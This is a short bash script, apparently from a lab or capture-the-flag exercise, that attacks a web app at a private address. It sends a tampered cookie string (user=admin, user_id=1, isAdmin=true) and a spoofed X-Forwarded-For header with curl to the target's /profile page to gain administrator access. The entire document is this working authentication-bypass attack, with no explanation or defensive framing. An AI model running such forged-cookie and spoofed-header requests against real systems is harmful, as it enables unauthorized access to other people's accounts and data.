#!/bin/bash
TARGET="http://172.20.10.2:3000"
MY_IP="10.0.0.103"
# Tampered cookie string
COOKIE="user=admin; user_id=1; isAdmin=true"

# -b: Send cookies from string
curl -L -v \
  -H "X-Forwarded-For: $MY_IP" \
  -b "$COOKIE" \
  "$TARGET/profile"

